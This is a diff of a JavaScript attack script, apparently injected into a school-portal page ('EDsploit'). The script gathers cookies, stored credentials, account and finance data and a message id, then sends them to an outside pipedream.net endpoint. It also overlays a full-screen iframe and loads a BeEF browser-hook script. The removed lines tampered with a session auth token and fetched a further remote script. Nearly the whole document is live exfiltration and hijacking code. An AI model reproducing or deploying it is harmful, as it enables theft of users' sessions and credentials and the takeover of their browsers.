@@ -1,10 +1,8 @@
-const ur = new URL(document.currentScript.src);
-const token = ur.searchParams.get("id") || "no";
-
 (async function ex() {
 
+	const ur = new URL(document.currentScript.src);
 	const url = 'https://eocokq62jnfdj8e.m.pipedream.net/session';
-  
+	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
 	const keys = [
 		'accounts', 'badges', 'credentials', 'edhydration_auth',
 		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
@@ -13,7 +11,9 @@ const token = ur.searchParams.get("id") || "no";
 	const data = {
 		t: new Date().toISOString(),
 		u: navigator.userAgent,
-		l: token,
+		d: messageid.searchParams.get('idMessage') || "null",
+		apiv: ur.searchParams.get("apiv") || "100.0",
+		si: ur.searchParams.get("signature") || false,
 		c: document.cookie,
 		s: Object.fromEntries(
 		keys
@@ -28,58 +28,35 @@ const token = ur.searchParams.get("id") || "no";
 
 	try {
 		await fetch(url, {
-		method: "POST",
-		headers: { "Content-Type": "application/json" },
-		body: JSON.stringify(data)
+			method: "POST",
+			headers: {
+				"Content-Type": "application/json"
+			},
+			body: JSON.stringify(data)
 		});
 	} catch {}
 })();
 
-(async function test() {
-    function a(b) {
-        const i = window.top.document.createElement('iframe');
-        i.src = "/";
-        i.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
-        i.className = 'testy';
-        window.top.document.body.appendChild(i);
+(async function iframe() {
+	const i = window.top.document.createElement('iframe');
+	i.src = "/";
+	i.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
+	i.className = 'EDsploit';
+	window.top.document.body.appendChild(i);
         
-        i.onload = () => {
-            const beef = window.top.document.createElement("script");
-            beef.src = "https://beef.local/hook.js";
-            beef.async = true;
-            window.top.document.body.appendChild(beef);
-        };
+	i.onload = () => {
+		const beef = window.top.document.createElement("script");
+		beef.src = "https://beef.local/hook.js";
+		beef.async = true;
+		window.top.document.body.appendChild(beef);
+	};
         
-        const c = setInterval(() => {
-            if (window.top.document.body.getElementsByClassName('testy').length > 0) {
-                clearInterval(c);
-                b();
-                setTimeout(() => {
-                    const credentials = JSON.parse(sessionStorage.getItem("credentials"));
-                    credentials.payload.authToken = "0100010101000100011100110111000001101100011011110110100101110100";
-                    sessionStorage.setItem("credentials", JSON.stringify(credentials));
-                }, 4000);
-            }
-        }, 10);
-        return;
-    }
-    
-    a(() => {
-        const b = document.createElement("iframe");
-        b.src = "/";
-        b.style.display = "none";
-        document.body.appendChild(b);
-        
-        b.onload = () => {
-            const c = b.contentDocument || b.contentWindow.document;
-            const d = setInterval(() => {
-                if (!c || !c.body) return;
-                clearInterval(d);
-                const e = c.createElement("script");
-                e.src = `https://exon-dv.github.io/a/b.js?id=${token}`;
-                e.async = true;
-                c.body.appendChild(e);
-            }, 50);
-        };
-    });
+	const c = setInterval(() => {
+		if (window.top.document.body.getElementsByClassName('EDsploit').length > 0) {
+			clearInterval(c);
+			b();
+		}
+	}, 10);
+	
+	return;
 })();
